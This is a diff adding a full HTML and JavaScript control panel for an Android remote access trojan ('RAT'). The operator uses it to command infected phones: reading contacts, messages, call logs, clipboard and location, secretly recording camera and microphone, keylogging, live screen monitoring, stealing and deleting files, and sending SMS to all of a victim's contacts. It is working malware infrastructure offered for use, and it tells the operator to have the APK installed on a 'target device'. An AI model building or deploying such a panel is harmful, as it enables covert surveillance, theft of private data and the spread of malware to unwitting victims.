@@ -1,0 +1,970 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Control Panel - RAT</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
+            color: #eee;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: rgba(0, 255, 213, 0.1);
+            padding: 1rem;
+            text-align: center;
+            border-bottom: 2px solid #00ffd5;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header h1 {
+            color: #00ffd5;
+            text-shadow: 0 0 10px rgba(0, 255, 213, 0.5);
+            margin-bottom: 0.5rem;
+        }
+
+        .header p {
+            color: #ccc;
+            font-size: 0.9rem;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .devices-section {
+            margin-bottom: 2rem;
+        }
+
+        .section-title {
+            color: #00ffd5;
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            text-align: center;
+            text-shadow: 0 0 5px rgba(0, 255, 213, 0.3);
+        }
+
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .device-card {
+            background: rgba(26, 26, 26, 0.9);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 1rem;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .device-card:hover {
+            border-color: #00ffd5;
+            box-shadow: 0 0 20px rgba(0, 255, 213, 0.2);
+        }
+
+        .device-card.selected {
+            border-color: #00ffd5 !important;
+            background: rgba(0, 255, 213, 0.1) !important;
+            box-shadow: 0 0 20px rgba(0, 255, 213, 0.3) !important;
+        }
+
+        .device-info {
+            margin-bottom: 1rem;
+        }
+
+        .device-info h3 {
+            color: #00ffd5;
+            margin-bottom: 0.5rem;
+        }
+
+        .device-info p {
+            color: #ccc;
+            font-size: 0.9rem;
+            margin: 0.2rem 0;
+        }
+
+        .controls-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .control-group {
+            background: rgba(26, 26, 26, 0.9);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 1rem;
+        }
+
+        .control-group h3 {
+            color: #00ffd5;
+            margin-bottom: 1rem;
+            text-align: center;
+            font-size: 1.1rem;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 0.75rem;
+            margin: 0.5rem 0;
+            background: linear-gradient(45deg, #00ffd5, #0ff);
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+
+        .btn:hover:not(:disabled) {
+            background: linear-gradient(45deg, #0ff, #00ffd5);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0, 255, 213, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .input-group {
+            margin: 1rem 0;
+        }
+
+        .input-group label {
+            display: block;
+            color: #ccc;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .input-group input,
+        .input-group textarea,
+        .input-group select {
+            width: 100%;
+            padding: 0.5rem;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #eee;
+            font-size: 0.9rem;
+        }
+
+        .input-group input:focus,
+        .input-group textarea:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: #00ffd5;
+            box-shadow: 0 0 10px rgba(0, 255, 213, 0.3);
+        }
+
+        .screenshot-section {
+            margin-top: 2rem;
+            text-align: center;
+        }
+
+        .screenshot-container {
+            background: rgba(26, 26, 26, 0.9);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+
+        .screenshot-img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .status {
+            padding: 0.75rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .status.success {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #0f0;
+            color: #0f0;
+        }
+
+        .status.error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #f00;
+            color: #f00;
+        }
+
+        .status.warning {
+            background: rgba(255, 255, 0, 0.2);
+            border: 1px solid #ff0;
+            color: #ff0;
+        }
+
+        .live-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .live-screen.active {
+            display: flex;
+        }
+
+        .live-screen img {
+            max-width: 90%;
+            max-height: 80%;
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(0, 255, 213, 0.5);
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #f00;
+            color: #fff;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1rem;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #00ffd5;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .connection-status {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .connection-status.online {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #0f0;
+            color: #0f0;
+        }
+
+        .connection-status.offline {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #f00;
+            color: #f00;
+        }
+
+        @media (max-width: 768px) {
+            .controls-section {
+                grid-template-columns: 1fr;
+            }
+
+            .container {
+                padding: 0 0.5rem;
+            }
+
+            .btn {
+                font-size: 0.8rem;
+                padding: 0.6rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="connection-status" id="connectionStatus">🔴 Offline</div>
+
+    <div class="header">
+        <h1>🔧 Web Control Panel RAT</h1>
+        <p>Remote Access Tool - Interface Web Advanced</p>
+    </div>
+
+    <div class="container">
+        <div class="devices-section">
+            <h2 class="section-title">📱 Connected Devices</h2>
+            <div class="devices-grid" id="devicesGrid">
+                <div class="device-card">
+                    <div class="device-info">
+                        <h3>No devices connected</h3>
+                        <p>Waiting for devices to connect...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="controls-section">
+            <!-- Information Controls -->
+            <div class="control-group">
+                <h3>📊 Device Information</h3>
+                <button class="btn" onclick="sendCommand('device_info')">Get Device Info</button>
+                <button class="btn" onclick="sendCommand('apps')">List Apps</button>
+                <button class="btn" onclick="sendCommand('contacts')">Get Contacts</button>
+                <button class="btn" onclick="sendCommand('messages')">Get Messages</button>
+                <button class="btn" onclick="sendCommand('calls')">Get Call Log</button>
+            </div>
+
+            <!-- Camera Controls -->
+            <div class="control-group">
+                <h3>📸 Camera Controls</h3>
+                <button class="btn" onclick="sendCommand('screenshot')">Take Screenshot</button>
+                <button class="btn" onclick="sendCommand('camera_main')">Main Camera Photo</button>
+                <button class="btn" onclick="sendCommand('camera_selfie')">Selfie Camera Photo</button>
+                <button class="btn" onclick="startLiveScreen()">🔴 Live Screen Monitor</button>
+                <div class="input-group">
+                    <label>Recording Duration (seconds):</label>
+                    <input type="number" id="videoDuration" value="10" min="5" max="60">
+                </div>
+                <button class="btn" onclick="recordVideo('main')">Record Main Camera</button>
+                <button class="btn" onclick="recordVideo('selfie')">Record Selfie Camera</button>
+            </div>
+
+            <!-- Audio Controls -->
+            <div class="control-group">
+                <h3>🎵 Audio Controls</h3>
+                <div class="input-group">
+                    <label>Record Duration (seconds):</label>
+                    <input type="number" id="micDuration" value="10" min="1" max="60">
+                </div>
+                <button class="btn" onclick="recordMicrophone()">Record Microphone</button>
+                <button class="btn" onclick="sendCommand('stop_audio')">Stop Audio</button>
+                <div class="input-group">
+                    <label>Audio URL to Play:</label>
+                    <input type="url" id="audioUrl" placeholder="https://example.com/audio.mp3">
+                </div>
+                <button class="btn" onclick="playAudio()">Play Audio</button>
+            </div>
+
+            <!-- SMS Controls -->
+            <div class="control-group">
+                <h3>💬 SMS Controls</h3>
+                <div class="input-group">
+                    <label>Phone Number:</label>
+                    <input type="text" id="smsNumber" placeholder="+1234567890">
+                </div>
+                <div class="input-group">
+                    <label>Message:</label>
+                    <textarea id="smsMessage" rows="3" placeholder="Enter your message"></textarea>
+                </div>
+                <button class="btn" onclick="sendSMS()">Send SMS</button>
+                <button class="btn" onclick="sendCommand('send_message_to_all')">Send to All Contacts</button>
+            </div>
+
+            <!-- Device Controls -->
+            <div class="control-group">
+                <h3>⚙️ Device Controls</h3>
+                <button class="btn" onclick="sendCommand('vibrate')">Vibrate</button>
+                <button class="btn" onclick="sendCommand('torch_on')">Torch ON</button>
+                <button class="btn" onclick="sendCommand('torch_off')">Torch OFF</button>
+                <button class="btn" onclick="sendCommand('location')">Get Location</button>
+                <div class="input-group">
+                    <label>Volume Level (0-100):</label>
+                    <input type="range" id="volumeLevel" min="0" max="100" value="50">
+                    <span id="volumeValue">50</span>
+                </div>
+                <button class="btn" onclick="setVolume()">Set Volume</button>
+            </div>
+
+            <!-- Advanced Controls -->
+            <div class="control-group">
+                <h3>🔧 Advanced Controls</h3>
+                <button class="btn" onclick="sendCommand('keylogger_on')">KeyLogger ON</button>
+                <button class="btn" onclick="sendCommand('keylogger_off')">KeyLogger OFF</button>
+                <button class="btn" onclick="sendCommand('clipboard')">Get Clipboard</button>
+                <div class="input-group">
+                    <label>Toast Message:</label>
+                    <input type="text" id="toastMessage" placeholder="Enter toast message">
+                </div>
+                <button class="btn" onclick="showToast()">Show Toast</button>
+                <div class="input-group">
+                    <label>URL to Open:</label>
+                    <input type="url" id="openUrl" placeholder="https://example.com">
+                </div>
+                <button class="btn" onclick="openUrl()">Open URL</button>
+            </div>
+
+            <!-- File Manager -->
+            <div class="control-group">
+                <h3>📁 File Manager</h3>
+                <div class="input-group">
+                    <label>File Path:</label>
+                    <input type="text" id="filePath" placeholder="/storage/emulated/0/DCIM">
+                </div>
+                <button class="btn" onclick="getFile()">Download File</button>
+                <button class="btn" onclick="deleteFile()">Delete File</button>
+                <button class="btn" onclick="sendCommand('file_list:/storage/emulated/0')">List SD Card Files</button>
+                <button class="btn" onclick="sendCommand('file_list:/storage/emulated/0/DCIM')">List Gallery</button>
+            </div>
+
+            <!-- Notification Controls -->
+            <div class="control-group">
+                <h3>🔔 Notification Controls</h3>
+                <div class="input-group">
+                    <label>Notification Title:</label>
+                    <input type="text" id="notifTitle" placeholder="Important Message">
+                </div>
+                <div class="input-group">
+                    <label>Notification Message:</label>
+                    <textarea id="notifMessage" rows="2" placeholder="Click to open link"></textarea>
+                </div>
+                <div class="input-group">
+                    <label>Click URL:</label>
+                    <input type="url" id="notifUrl" placeholder="https://example.com">
+                </div>
+                <button class="btn" onclick="showNotification()">Send Notification</button>
+            </div>
+
+            <!-- System Controls -->
+            <div class="control-group">
+                <h3>🎛️ System Controls</h3>
+                <button class="btn" onclick="sendCommand('btn_home')">Home Button</button>
+                <button class="btn" onclick="sendCommand('btn_back')">Back Button</button>
+                <button class="btn" onclick="sendCommand('btn_recent')">Recent Apps</button>
+                <button class="btn" onclick="sendCommand('btn_power')">Power Button</button>
+                <button class="btn" onclick="sendCommand('btn_vol_up')">Volume Up</button>
+                <button class="btn" onclick="sendCommand('btn_vol_down')">Volume Down</button>
+            </div>
+        </div>
+
+        <div class="screenshot-section">
+            <h2 class="section-title">📷 Latest Screenshot</h2>
+            <div class="screenshot-container">
+                <img id="latestScreenshot" class="screenshot-img" src="" alt="No screenshot available" style="display: none;">
+                <p id="screenshotStatus">No screenshot taken yet</p>
+                <button class="btn" onclick="refreshScreenshot()">Refresh Screenshot</button>
+                <button class="btn" onclick="downloadScreenshot()">Download Screenshot</button>
+            </div>
+        </div>
+
+        <div id="statusMessage"></div>
+    </div>
+
+    <!-- Live Screen Monitor Modal -->
+    <div class="live-screen" id="liveScreen">
+        <button class="close-btn" onclick="stopLiveScreen()">✕ Close</button>
+        <h2 style="color: #00ffd5; margin-bottom: 1rem;">🔴 Live Screen Monitor</h2>
+        <img id="liveScreenshot" src="" alt="Live Screenshot">
+        <p style="color: #ccc; margin-top: 1rem;">Auto-refreshing every 1.5 seconds</p>
+        <div style="margin-top: 1rem;">
+            <button class="btn" style="width: auto; margin: 0 0.5rem;" onclick="pauseLiveScreen()">⏸️ Pause</button>
+            <button class="btn" style="width: auto; margin: 0 0.5rem;" onclick="resumeLiveScreen()">▶️ Resume</button>
+            <button class="btn" style="width: auto; margin: 0 0.5rem;" onclick="toggleHighQuality()">🔄 Force Refresh</button>
+        </div>
+    </div>
+
+    <script>
+        let selectedDevice = 'demo';
+        let liveScreenInterval = null;
+        let liveScreenPaused = false;
+        let isOnline = false;
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            loadDevices();
+            refreshScreenshot();
+            checkConnection();
+
+            // Set up periodic updates
+            setInterval(loadDevices, 5000);
+            setInterval(checkConnection, 3000);
+
+            // Set up volume slider
+            const volumeSlider = document.getElementById('volumeLevel');
+            const volumeValue = document.getElementById('volumeValue');
+            volumeSlider.addEventListener('input', () => {
+                volumeValue.textContent = volumeSlider.value;
+            });
+        });
+
+        // Check connection status
+        async function checkConnection() {
+            try {
+                const response = await fetch('/api/devices', { 
+                    method: 'GET',
+                    signal: AbortSignal.timeout(3000)
+                });
+
+                if (response.ok) {
+                    updateConnectionStatus(true);
+                } else {
+                    updateConnectionStatus(false);
+                }
+            } catch (error) {
+                updateConnectionStatus(false);
+            }
+        }
+
+        // Update connection status indicator
+        function updateConnectionStatus(online) {
+            const statusElement = document.getElementById('connectionStatus');
+            if (online !== isOnline) {
+                isOnline = online;
+                if (online) {
+                    statusElement.textContent = '🟢 Online';
+                    statusElement.className = 'connection-status online';
+                } else {
+                    statusElement.textContent = '🔴 Offline';
+                    statusElement.className = 'connection-status offline';
+                }
+            }
+        }
+
+        // Load connected devices
+        async function loadDevices() {
+            try {
+                const response = await fetch('/api/devices');
+
+                if (!response.ok) {
+                    throw new Error('Failed to fetch devices');
+                }
+
+                const devices = await response.json();
+                const devicesGrid = document.getElementById('devicesGrid');
+
+                if (devices.length === 0) {
+                    devicesGrid.innerHTML = `
+                        <div class="device-card">
+                            <div class="device-info">
+                                <h3>No devices connected</h3>
+                                <p>Waiting for devices to connect...</p>
+                                <p style="color: #00ffd5;">Make sure the APK is installed and running on target device</p>
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    devicesGrid.innerHTML = devices.map(device => `
+                        <div class="device-card ${selectedDevice === device.uuid ? 'selected' : ''}" onclick="selectDevice('${device.uuid}')">
+                            <div class="device-info">
+                                <h3>${device.model}</h3>
+                                <p><strong>Battery:</strong> ${device.battery}</p>
+                                <p><strong>Android:</strong> ${device.version}</p>
+                                <p><strong>Brightness:</strong> ${device.brightness}</p>
+                                <p><strong>Provider:</strong> ${device.provider}</p>
+                                <p><strong>UUID:</strong> ${device.uuid.substring(0, 8)}...</p>
+                                <p style="color: #00ffd5; margin-top: 0.5rem;">🟢 Connected</p>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Error loading devices:', error);
+                showStatus('Error loading devices: ' + error.message, 'error');
+            }
+        }
+
+        // Select device
+        function selectDevice(uuid) {
+            selectedDevice = uuid;
+            loadDevices();
+            showStatus(`Device selected: ${uuid.substring(0, 8)}...`, 'success');
+        }
+
+        // Send command to device
+        async function sendCommand(command) {
+            if (!selectedDevice || selectedDevice === 'demo') {
+                showStatus('Please select a connected device first', 'warning');
+                return;
+            }
+
+            try {
+                showLoading(true);
+                const response = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        command: command,
+                        device: selectedDevice
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showStatus(`Command "${command}" sent successfully!`, 'success');
+                } else {
+                    showStatus(`Failed to send command: ${result.message}`, 'error');
+                }
+            } catch (error) {
+                showStatus(`Error: ${error.message}`, 'error');
+            } finally {
+                showLoading(false);
+            }
+        }
+
+        // Send SMS
+        async function sendSMS() {
+            const number = document.getElementById('smsNumber').value.trim();
+            const message = document.getElementById('smsMessage').value.trim();
+
+            if (!number || !message) {
+                showStatus('Please enter both phone number and message', 'error');
+                return;
+            }
+
+            if (!selectedDevice || selectedDevice === 'demo') {
+                showStatus('Please select a connected device first', 'warning');
+                return;
+            }
+
+            try {
+                showLoading(true);
+                const response = await fetch('/api/sms', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        number: number,
+                        message: message,
+                        device: selectedDevice
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showStatus('SMS sent successfully!', 'success');
+                    document.getElementById('smsNumber').value = '';
+                    document.getElementById('smsMessage').value = '';
+                } else {
+                    showStatus(`Failed to send SMS: ${result.message}`, 'error');
+                }
+            } catch (error) {
+                showStatus(`Error: ${error.message}`, 'error');
+            } finally {
+                showLoading(false);
+            }
+        }
+
+        // Record microphone
+        function recordMicrophone() {
+            const duration = document.getElementById('micDuration').value;
+            if (duration < 1 || duration > 60) {
+                showStatus('Duration must be between 1 and 60 seconds', 'error');
+                return;
+            }
+            sendCommand(`microphone:${duration}`);
+        }
+
+        // Record video
+        function recordVideo(camera) {
+            const duration = document.getElementById('videoDuration').value;
+            if (duration < 5 || duration > 60) {
+                showStatus('Duration must be between 5 and 60 seconds', 'error');
+                return;
+            }
+            sendCommand(`rec_camera_${camera}:${duration}`);
+        }
+
+        // Play audio
+        function playAudio() {
+            const audioUrl = document.getElementById('audioUrl').value.trim();
+            if (!audioUrl) {
+                showStatus('Please enter an audio URL', 'error');
+                return;
+            }
+            sendCommand(`play_audio:${audioUrl}`);
+        }
+
+        // Show toast
+        function showToast() {
+            const message = document.getElementById('toastMessage').value.trim();
+            if (!message) {
+                showStatus('Please enter a toast message', 'error');
+                return;
+            }
+            sendCommand(`toast:${message}`);
+            document.getElementById('toastMessage').value = '';
+        }
+
+        // Open URL
+        function openUrl() {
+            const url = document.getElementById('openUrl').value.trim();
+            if (!url) {
+                showStatus('Please enter a URL', 'error');
+                return;
+            }
+            sendCommand(`open_target_link:${url}`);
+            document.getElementById('openUrl').value = '';
+        }
+
+        // Get file
+        function getFile() {
+            const filePath = document.getElementById('filePath').value.trim();
+            if (!filePath) {
+                showStatus('Please enter a file path', 'error');
+                return;
+            }
+            sendCommand(`file:${filePath}`);
+        }
+
+        // Delete file
+        function deleteFile() {
+            const filePath = document.getElementById('filePath').value.trim();
+            if (!filePath) {
+                showStatus('Please enter a file path', 'error');
+                return;
+            }
+            if (confirm('Are you sure you want to delete this file/folder?')) {
+                sendCommand(`delete_file:${filePath}`);
+            }
+        }
+
+        // Show notification
+        function showNotification() {
+            const title = document.getElementById('notifTitle').value.trim();
+            const message = document.getElementById('notifMessage').value.trim();
+            const url = document.getElementById('notifUrl').value.trim();
+
+            if (!title || !message) {
+                showStatus('Please enter notification title and message', 'error');
+                return;
+            }
+
+            sendCommand(`show_notification:${title}/${url || 'https://google.com'}`);
+        }
+
+        // Set volume
+        function setVolume() {
+            const volume = document.getElementById('volumeLevel').value;
+            sendCommand(`set_volume:${volume}`);
+        }
+
+        // Refresh screenshot
+        async function refreshScreenshot() {
+            try {
+                showLoading(true);
+                // Force new screenshot capture
+                await sendCommand('screenshot');
+
+                // Wait a bit for screenshot to be processed
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                const response = await fetch('/api/latest-screenshot?' + new Date().getTime());
+
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const imageUrl = URL.createObjectURL(blob);
+
+                    const img = document.getElementById('latestScreenshot');
+                    const status = document.getElementById('screenshotStatus');
+
+                    // Clean up previous image URL
+                    if (img.src && img.src.startsWith('blob:')) {
+                        URL.revokeObjectURL(img.src);
+                    }
+
+                    img.src = imageUrl;
+                    img.style.display = 'block';
+                    status.textContent = 'Latest screenshot loaded - ' + new Date().toLocaleTimeString();
+                    status.style.color = '#0f0';
+                } else {
+                    const status = document.getElementById('screenshotStatus');
+                    status.textContent = 'No screenshot available';
+                    status.style.color = '#f00';
+                }
+            } catch (error) {
+                console.error('Error loading screenshot:', error);
+                const status = document.getElementById('screenshotStatus');
+                status.textContent = 'Error loading screenshot';
+                status.style.color = '#f00';
+            } finally {
+                showLoading(false);
+            }
+        }
+
+        // Download screenshot
+        function downloadScreenshot() {
+            const img = document.getElementById('latestScreenshot');
+            if (img.src && img.style.display !== 'none') {
+                const link = document.createElement('a');
+                link.href = img.src;
+                link.download = 'screenshot_' + new Date().getTime() + '.png';
+                link.click();
+            } else {
+                showStatus('No screenshot available to download', 'error');
+            }
+        }
+
+        // Start live screen monitoring
+        function startLiveScreen() {
+            const liveScreen = document.getElementById('liveScreen');
+            liveScreen.classList.add('active');
+            liveScreenPaused = false;
+
+            // Initial screenshot
+            sendCommand('screenshot');
+
+            // More frequent refresh for real-time monitoring
+            liveScreenInterval = setInterval(() => {
+                if (!liveScreenPaused) {
+                    sendCommand('screenshot');
+                    setTimeout(updateLiveScreenshot, 1000);
+                }
+            }, 1500); // Reduced interval for more responsive updates
+
+            // Initial update
+            setTimeout(updateLiveScreenshot, 1500);
+        }
+
+        // Stop live screen monitoring
+        function stopLiveScreen() {
+            const liveScreen = document.getElementById('liveScreen');
+            liveScreen.classList.remove('active');
+
+            if (liveScreenInterval) {
+                clearInterval(liveScreenInterval);
+                liveScreenInterval = null;
+            }
+            liveScreenPaused = false;
+        }
+
+        // Pause live screen
+        function pauseLiveScreen() {
+            liveScreenPaused = true;
+            showStatus('Live screen paused', 'warning');
+        }
+
+        // Resume live screen
+        function resumeLiveScreen() {
+            liveScreenPaused = false;
+            showStatus('Live screen resumed', 'success');
+        }
+
+        // Force refresh live screen
+        function toggleHighQuality() {
+            if (!liveScreenPaused) {
+                sendCommand('screenshot');
+                setTimeout(() => {
+                    updateLiveScreenshot();
+                    showStatus('Live screen force refreshed', 'success');
+                }, 1000);
+            }
+        }
+
+        // Update live screenshot
+        async function updateLiveScreenshot() {
+            try {
+                const response = await fetch('/api/latest-screenshot?' + new Date().getTime());
+
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const imageUrl = URL.createObjectURL(blob);
+
+                    const img = document.getElementById('liveScreenshot');
+                    if (img.src) {
+                        URL.revokeObjectURL(img.src);
+                    }
+                    img.src = imageUrl;
+                }
+            } catch (error) {
+                console.error('Error updating live screenshot:', error);
+            }
+        }
+
+        // Show status message
+        function showStatus(message, type = 'success') {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.className = `status ${type}`;
+            statusDiv.textContent = message;
+            statusDiv.style.display = 'block';
+
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 5000);
+        }
+
+        // Show/hide loading state
+        function showLoading(show) {
+            const buttons = document.querySelectorAll('.btn');
+            buttons.forEach(btn => {
+                btn.disabled = show;
+                if (show && !btn.innerHTML.includes('loader')) {
+                    btn.innerHTML = '<span class="loader"></span> ' + btn.textContent;
+                } else if (!show && btn.innerHTML.includes('loader')) {
+                    btn.innerHTML = btn.textContent.replace(/^.*?> /, '');
+                }
+            });
+        }
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey || e.metaKey) {
+                switch(e.key) {
+                    case 'r':
+                        e.preventDefault();
+                        refreshScreenshot();
+                        break;
+                    case 'd':
+                        e.preventDefault();
+                        loadDevices();
+                        break;
+                    case 's':
+                        e.preventDefault();
+                        sendCommand('screenshot');
+                        break;
+                }
+            }
+        });
+
+        // Add error handling for network issues
+        window.addEventListener('online', () => {
+            showStatus('Connection restored', 'success');
+            checkConnection();
+        });
+
+        window.addEventListener('offline', () => {
+            showStatus('Connection lost', 'error');
+            updateConnectionStatus(false);
+        });
+    </script>
+</body>
+</html>
